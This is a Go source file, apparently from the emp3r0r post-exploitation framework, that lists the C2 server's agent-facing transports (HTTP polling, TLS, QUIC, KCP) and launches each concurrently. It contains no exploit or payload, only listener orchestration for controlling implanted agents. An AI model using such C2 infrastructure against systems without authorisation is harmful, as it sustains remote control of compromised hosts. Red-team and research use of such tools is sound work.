package server

import (
	"context"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// c2TransportStarter starts one C2 agent-facing transport. The function blocks
// while the listener is serving and returns when it stops or fails to start.
type c2TransportStarter struct {
	name  string
	start func(context.Context) error
}

// c2TransportStarters is the complete set of agent-facing transports a C2
// serves. The TLS frontend covers both h2conn and http_poll; the plain HTTP
// listener is kept separately for proxies and direct polling. The channel mode
// in an agent's build selects how that agent dials in, and must not decide
// which listeners exist.
func c2TransportStarters() []c2TransportStarter {
	return []c2TransportStarter{
		{
			name: "http_poll",
			start: func(context.Context) error {
				StartC2HTTPServer()
				return nil
			},
		},
		{
			name:  "tls",
			start: func(context.Context) error { return StartC2TLSStreamServer() },
		},
		{
			name:  "quic",
			start: func(context.Context) error { return StartC2QUICServer() },
		},
		{
			name: "kcp",
			start: func(ctx context.Context) error {
				return KCPC2ListenAndServe(ctx, network.EmpKCPCancel)
			},
		},
	}
}

// startAllC2Transports launches every compiled transport concurrently. A
// transport that is not compiled into this build returns an error from its
// stub; that must not prevent the others from serving.
func startAllC2Transports() {
	prepareC2ServerPrerequisites()

	ctx, cancel := context.WithCancel(context.Background())
	network.EmpKCPCtx, network.EmpKCPCancel = ctx, cancel

	launchC2Transports(ctx, c2TransportStarters())
}

// launchC2Transports starts every starter in its own goroutine. It is separate
// from startAllC2Transports so tests can verify the fan-out without binding
// real ports.
func launchC2Transports(ctx context.Context, starters []c2TransportStarter) {
	for _, starter := range starters {
		starter := starter
		go func() {
			if err := starter.start(ctx); err != nil {
				logging.Warningf("C2 transport %s unavailable: %v", starter.name, err)
			}
		}()
	}
}
